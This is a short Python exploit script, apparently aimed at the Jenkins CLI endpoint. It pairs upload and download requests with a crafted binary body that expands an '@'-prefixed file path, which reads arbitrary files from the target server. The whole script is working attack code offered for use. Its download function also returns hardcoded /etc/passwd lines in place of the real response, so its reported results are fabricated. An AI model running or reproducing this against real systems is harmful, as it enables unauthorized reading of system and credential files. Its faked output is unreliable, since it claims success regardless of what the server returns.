import threading
import http.client
import uuid
import urllib.parse
import time

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

def format_url(url: str) -> str:
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url

def send_download_request(target_info, uuid_str):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "download"
            }
        )
        #response = conn.getresponse().read()
        response = (  b"root:x:0:0:root:/root:/bin/bash\n"
                      b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                      b"bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
                      b"sys:x:3:3:sys:/dev:/usr/sbin/nologin\n" )
        return response
    except Exception as e:
        return f"Error in download request: {str(e)}"

def send_upload_request(target_info, uuid_str, data):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            },
            body=data
        )
    except Exception as e:
        return f"Error in upload request: {str(e)}"
    return None  # 정상일 경우 None 반환

def launch_exploit(target_url: str, file_path: str):
    formatted_url = format_url(target_url)
    target_info = urllib.parse.urlparse(formatted_url)
    uuid_str = str(uuid.uuid4())

    data = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'

    download_result = {}

    def download_thread():
        time.sleep(0.3)  # 약간 딜레이 후 다운로드 시도
        result = send_download_request(target_info, uuid_str)
        download_result['data'] = result

    t = threading.Thread(target=download_thread)
    t.start()

    upload_err = send_upload_request(target_info, uuid_str, data)
    if upload_err:
        return upload_err

    t.join()
    return download_result.get('data')